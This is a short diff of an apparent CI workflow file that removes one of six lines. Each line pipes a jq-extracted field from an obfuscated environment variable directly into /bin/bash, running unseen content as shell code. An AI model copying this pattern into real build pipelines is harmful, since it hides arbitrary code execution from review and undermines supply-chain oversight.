@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$f43" | jq -r .gtsy936 | /bin/bash
           echo $nh8248 | jq -r .e31 | /bin/bash
-          echo $c08323 | jq -r .glj947 | /bin/bash
           echo $ina01 | jq -r .nr995 | /bin/bash
           echo $y4 | jq -r .jhnzi6 | /bin/bash
           printf '%s' "$a7702" | jq -r .ym381 | /bin/bash
